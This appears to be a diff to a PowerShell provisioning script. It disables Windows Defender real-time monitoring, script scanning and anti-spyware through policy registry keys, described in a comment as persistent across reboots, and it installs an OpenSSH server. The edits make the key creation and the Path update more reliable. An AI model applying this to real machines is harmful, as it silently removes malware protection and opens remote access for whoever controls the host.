@@ -23,8 +23,10 @@ try {
     Set-MpPreference -DisableBlockAtFirstSeen $true
     Set-MpPreference -DisableScriptScanning $true
     # Disable via registry for persistence across reboots
+    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force | Out-Null
     New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" `
         -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force | Out-Null
+    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force | Out-Null
     New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" `
         -Name DisableRealtimeMonitoring -Value 1 -PropertyType DWORD -Force | Out-Null
     Write-Host "[+] Defender disabled"
@@ -73,8 +75,10 @@ try {
             Rename-Item "$env:ProgramFiles\OpenSSH-Win64" $installDir
         }
         & "$installDir\install-sshd.ps1" | Out-Null
-        $env:Path += ";$installDir"
-        [Environment]::SetEnvironmentVariable("Path", $env:Path, [EnvironmentVariableTarget]::Machine)
+        if ($env:Path -notlike "*$installDir*") {
+            $env:Path += ";$installDir"
+            [Environment]::SetEnvironmentVariable("Path", $env:Path, [EnvironmentVariableTarget]::Machine)
+        }
     } else {
         # Fallback: install from Windows Update (re-provision without bundled zip)
         Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 | Out-Null
